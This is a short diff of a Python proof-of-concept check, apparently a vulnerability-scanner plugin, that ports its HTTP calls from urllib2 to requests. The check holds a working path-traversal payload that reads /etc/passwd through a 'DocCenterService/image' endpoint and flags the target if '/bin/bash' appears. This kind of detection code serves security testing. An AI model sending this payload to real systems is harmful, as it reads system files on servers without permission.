@@ -35,10 +35,9 @@ class Poc(ABPoc):
             #__refer__  = http://www.wooyun.org/bugs/wooyun-2010-093845
             payload = "/DocCenterService/image?photo_size=../../../../../../../../../../etc/passwd%00&photo_id=1"
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
             
-            if req.getcode() == 200 and '/bin/bash' in content:
+            if req.status_code == 200 and '/bin/bash' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
